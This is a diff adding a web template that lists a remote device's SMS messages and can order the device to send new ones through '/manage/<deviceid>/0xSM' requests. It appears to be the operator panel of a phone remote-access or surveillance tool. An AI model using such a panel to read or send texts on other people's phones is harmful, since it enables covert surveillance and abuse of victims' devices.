@@ -1,0 +1,178 @@
+<div class="data-container">
+  <div class="data-controls">
+    <div class="control-bar">
+      <div class="search-box" style="flex: 1; max-width: 400px;">
+        <i class="search icon"></i>
+        <input type="text" id="searchInput" class="form-input" placeholder="Search by phone number or message...">
+      </div>
+      <button class="btn btn-primary" onclick="refreshData()">
+        <i class="refresh icon"></i> Refresh
+      </button>
+      <button class="btn btn-success" onclick="showSendSMS()">
+        <i class="paper plane icon"></i> Send SMS
+      </button>
+    </div>
+  </div>
+
+  <div class="data-table-container">
+    <table class="table">
+      <thead>
+        <tr>
+          <th>Contact Name</th>
+          <th>Phone Number</th>
+          <th>Type</th>
+          <th>Message</th>
+          <th>Date & Time</th>
+        </tr>
+      </thead>
+      <tbody id="dataTableBody">
+        <% if (pageData && pageData.length > 0) { %>
+          <% pageData.forEach(function(sms) { %>
+            <tr>
+              <td><%= sms.name || 'Unknown' %></td>
+              <td><%= sms.address || '-' %></td>
+              <td>
+                <span class="sms-type <%= sms.type === 'inbox' ? 'inbox' : 'sent' %>">
+                  <%= sms.type === 'inbox' ? 'Inbox' : 'Sent' %>
+                </span>
+              </td>
+              <td class="message-preview"><%= sms.body || '-' %></td>
+              <td><%= sms.date ? new Date(sms.date).toLocaleString() : '-' %></td>
+            </tr>
+          <% }); %>
+        <% } else { %>
+          <tr>
+            <td colspan="5" class="text-center" style="padding: 40px; color: #718096;">
+              <i class="comment alternate icon" style="font-size: 48px; margin-bottom: 16px; display: block; color: #cbd5e0;"></i>
+              No SMS messages available
+            </td>
+          </tr>
+        <% } %>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<style>
+  .data-container {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  .data-controls {
+    background: white;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+  }
+
+  .control-bar {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  .search-box {
+    position: relative;
+  }
+
+  .search-box i {
+    position: absolute;
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #a0aec0;
+  }
+
+  .search-box input {
+    padding-left: 45px;
+  }
+
+  .sms-type {
+    padding: 4px 12px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+  }
+
+  .sms-type.inbox {
+    background: rgba(72, 187, 120, 0.1);
+    color: #48bb78;
+  }
+
+  .sms-type.sent {
+    background: rgba(66, 153, 225, 0.1);
+    color: #4299e1;
+  }
+
+  .message-preview {
+    max-width: 300px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+</style>
+
+<script>
+  function refreshData() {
+    fetch(`/manage/<%= deviceid %>/0xSM`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'same-origin',
+      body: JSON.stringify({ action: 'ls' })
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert('Request sent to update SMS');
+      setTimeout(() => location.reload(), 2000);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Failed to request SMS update');
+    });
+  }
+
+  function showSendSMS() {
+    const phone = prompt('Enter phone number:');
+    if (!phone) return;
+    
+    const message = prompt('Enter message:');
+    if (!message) return;
+
+    fetch(`/manage/<%= deviceid %>/<%= typeof global !== 'undefined' && global.CONST ? global.CONST.messageKeys.sms : '0xSM' %>`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'same-origin',
+      body: JSON.stringify({
+        action: 'sendSMS',
+        to: phone,
+        sms: message
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.status) {
+        alert('SMS sent successfully!');
+        refreshData();
+      } else {
+        alert('Failed to send SMS: ' + (data.error || 'Unknown error'));
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Failed to send SMS');
+    });
+  }
+
+  document.getElementById('searchInput')?.addEventListener('input', function() {
+    const searchValue = this.value.toLowerCase();
+    const rows = document.querySelectorAll('#dataTableBody tr');
+    rows.forEach(row => {
+      const text = row.textContent.toLowerCase();
+      row.style.display = text.includes(searchValue) ? '' : 'none';
+    });
+  });
+</script>
